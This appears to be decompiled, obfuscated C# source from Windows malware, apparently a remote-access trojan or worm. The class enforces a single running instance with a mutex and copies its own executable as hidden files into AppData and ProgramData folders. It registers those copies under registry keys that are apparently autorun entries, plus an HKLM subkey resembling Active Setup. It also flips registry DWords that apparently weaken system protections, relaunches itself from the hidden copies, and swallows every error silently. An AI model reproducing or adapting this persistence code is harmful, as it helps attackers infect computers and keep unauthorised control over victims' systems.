using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using ns1;
using ns3;

namespace ns0;

internal class Class11
{
	public static RegistryKey registryKey_0;

	private static Mutex mutex_0;

	public static void smethod_0(string[] string_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		Class3.smethod_5();
		Class12.smethod_0();
		if (string.Join(Convert.ToString(32), string_0) == _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_19())
		{
			Process.Start(Class12.string_0);
			Environment.Exit(0);
		}
		if (Class12.bool_0)
		{
			registryKey_0 = Registry.LocalMachine;
		}
		else
		{
			registryKey_0 = Registry.CurrentUser;
		}
		try
		{
			Registry.CurrentUser.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_20(), writable: true)!.DeleteSubKey(Class12.string_2);
		}
		catch
		{
		}
		smethod_5();
		smethod_4();
		smethod_1();
		Class4.smethod_0();
		Class8.smethod_0();
		Class10.smethod_0();
		Class6.smethod_0();
	}

	private static void smethod_1()
	{
		if (Class12.bool_0)
		{
			Class12.string_5[0] = string.Format(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), Class12.string_5[0]);
			Class12.string_5[1] = string.Format(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles), Class12.string_5[1]);
		}
		else
		{
			Class12.string_5[0] = string.Format(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Class12.string_5[0]);
			Class12.string_5[1] = string.Format(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Class12.string_5[1]);
		}
		if (!smethod_3())
		{
			string[] string_ = Class12.string_5;
			foreach (string text in string_)
			{
				if (Class0.smethod_2(Class12.string_0, text))
				{
					continue;
				}
				try
				{
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(Class12.string_0, text, overwrite: true);
					File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.Archive);
				}
				catch
				{
				}
			}
			try
			{
				if (registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_22()) == null)
				{
					registryKey_0.CreateSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_22());
				}
			}
			catch
			{
			}
			try
			{
				if (registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_23()) == null)
				{
					registryKey_0.CreateSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_23());
				}
			}
			catch
			{
			}
			try
			{
				registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_22(), writable: true)!.SetValue(Class12.string_6[0], Class12.string_5[0]);
				registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_23(), writable: true)!.SetValue(Class12.string_6[1], Class12.string_5[1]);
			}
			catch
			{
			}
			try
			{
				if (Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_24() + Class12.string_2) == null)
				{
					Registry.LocalMachine.CreateSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_24() + Class12.string_2);
				}
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_24() + Class12.string_2, writable: true);
				registryKey.SetValue(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_25(), Class12.string_5[0] + _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_26());
				registryKey.SetValue(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_27(), 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
		if (Class12.string_0 != Class12.string_5[0] && Class12.string_0 != Class12.string_5[1])
		{
			try
			{
				mutex_0.Close();
				string[] string_2 = Class12.string_5;
				foreach (string fileName in string_2)
				{
					Process.Start(fileName);
				}
			}
			catch
			{
			}
			Environment.Exit(0);
		}
		Class3.smethod_4(ref Class12.byte_0);
	}

	public static void smethod_2()
	{
		Class6.smethod_1();
		Class4.smethod_1();
		try
		{
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_22(), writable: true)!.DeleteValue(Class12.string_6[0]);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_23(), writable: true)!.DeleteValue(Class12.string_6[1]);
			Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_20(), writable: true)!.DeleteSubKey(Class12.string_2);
		}
		catch
		{
		}
		string[] string_ = Class12.string_5;
		foreach (string path in string_)
		{
			try
			{
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch
			{
			}
		}
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
	}

	private static bool smethod_3()
	{
		string[] string_ = Class12.string_5;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string string_2 = string_[num];
				if (!Class0.smethod_2(Class12.string_0, string_2))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static void smethod_4()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_28(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_29(), 2, RegistryValueKind.DWord);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_28(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_30(), 0, RegistryValueKind.DWord);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_31(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_32(), 0, RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	private static void smethod_5()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class12.string_2);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(0);
		}
	}
}
